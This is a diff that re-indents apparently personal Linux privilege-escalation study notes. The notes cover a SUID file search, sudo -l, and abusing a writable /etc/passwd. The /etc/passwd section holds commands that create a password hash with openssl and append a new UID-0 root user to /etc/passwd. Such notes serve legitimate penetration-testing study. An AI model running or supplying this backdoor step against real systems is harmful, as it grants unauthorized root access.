@@ -65,29 +65,29 @@ find / -perm -u=s -type f 2>/dev/null
 - `/etc/shadow`
 - `/etc/passwd`
     - Create new user with known password, set `UID = 0` (root access)
-    ```bash
-    # Create password hash
-    openssl passwd -1 -salt [salt] [password]
-    openssl passwod -1 -salt new 123
-        $1$new$p7ptkEKU1HnaHpRtzNizS1 
-    # Add new root user to /etc/passwd
-    echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
-    ```
-    - Example:
-    ```bash
-    jan:x:1000:100:Jan Keuchel:/home/jan:/run/current-system/sw/bin/zsh
+        ```bash
+        # Create password hash
+        openssl passwd -1 -salt [salt] [password]
+        openssl passwod -1 -salt new 123
+            $1$new$p7ptkEKU1HnaHpRtzNizS1 
+        # Add new root user to /etc/passwd
+        echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
+        ```
+        ```bash
+        # Example
+        jan:x:1000:100:Jan Keuchel:/home/jan:/run/current-system/sw/bin/zsh
 
-    # Format:
-    # username : password : UID : GID : comment : home_dir : shell 
-    # <password> is either the password hash or a 'x' if the actual
-    # password is stored inside /etc/shadow 
-    ```
+        # Format:
+        # username : password : UID : GID : comment : home_dir : shell 
+        # <password> is either the password hash or a 'x' if the actual
+        # password is stored inside /etc/shadow 
+        ```
 - `/etc/sudoers`
-    - Who is allowed to run `sudo` and which commands
-    ```bash
-    # Get the commands the current user is allowed to run as sudo
-    sudo -l
-    ```
+    - Who is allowed to run `sudo` and which commands?
+        ```bash
+        # Get the commands the current user is allowed to run as sudo
+        sudo -l
+        ```
 
 #### Sensitive files readable
 - `/etc/shadow`
